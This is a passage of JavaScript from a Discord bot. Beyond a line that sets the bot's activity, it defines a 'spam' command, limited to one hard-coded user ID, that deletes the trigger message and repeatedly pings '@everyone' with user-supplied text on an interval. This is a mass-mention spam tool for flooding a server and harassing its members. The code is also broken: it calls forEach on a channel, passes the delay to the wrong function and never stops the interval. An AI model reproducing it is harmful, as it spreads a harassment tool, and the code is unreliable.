            bot.user.setActivity(`${PlayTime}`, {type: "PLAYING"})
        }

        if (message.content === prefix + "spam") {
            if (message.author.id != "374882828246319104") return;
             message.delete()
             let SpamTime = args.slice(0).join(" ");
             let i = 0;
             let interval = setInterval(function () {
               message.guild.channels.forEach(channel => {
                 if (channel.type === "text")channel.forEach();message.channel.send(`@everyone ${SpamTime}`)
               }, 1000);
             });
           }

});
